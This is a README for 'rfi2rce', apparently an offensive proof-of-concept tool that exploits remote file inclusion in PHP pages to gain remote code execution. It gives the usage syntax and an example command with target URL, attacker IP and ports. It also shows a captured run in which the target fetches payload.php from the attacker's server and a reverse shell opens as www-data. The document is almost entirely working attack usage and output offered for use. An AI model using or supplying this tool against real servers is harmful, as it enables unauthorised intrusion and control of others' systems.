# rfi2rce
Remote File Inclusion To Remote Code Execution (PoC)  

```zsh
rfi2rce - Remote File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*
Usage python3 rfi2rce <url> <attacker ip> <attacker port> <attacker server port>
Example: python3 rfi2rce http://ghost.server/index.php?page= 10.0.2.15 1337 8080
```

Successful connection example  
```
┌──(root💀ghost)-[/home/ghost/rfi2rce]
└─# python3 rfi2rce http://ghost.server/index.php?page= 10.0.2.15 1337 8080
rfi2rce - Remote File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*
HTTP server on 8080
listening on [any] 1337 ...
10.0.2.15 - - [09/Oct/2022 12:11:48] "GET /payload.php HTTP/1.1" 200 -
10.0.2.15: inverse host lookup failed: Unknown host
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.15] 44080
Linux ghost 5.16.0-kali7-amd64 #1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01) x86_64 GNU/Linux
 12:11:48 up  1:05,  2 users,  load average: 0.11, 0.11, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ghost    tty7     :0               11:17    1:05m 36.02s  0.14s xfce4-session
ghost    pts/1    -                11:17    3.00s  3.86s  0.10s sudo su root
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
